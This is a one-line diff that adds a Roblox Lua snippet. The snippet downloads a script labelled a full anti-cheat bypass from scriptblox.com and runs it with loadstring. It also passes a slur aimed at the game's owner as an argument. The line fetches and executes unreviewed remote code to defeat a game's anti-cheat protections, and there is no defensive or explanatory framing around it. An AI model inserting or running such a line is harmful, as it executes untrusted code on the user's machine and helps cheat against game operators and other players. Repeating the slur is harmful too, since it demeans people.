@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://scriptblox.com/raw/full-anticheat-bypass_642",ownerofthisgame==retarded))()
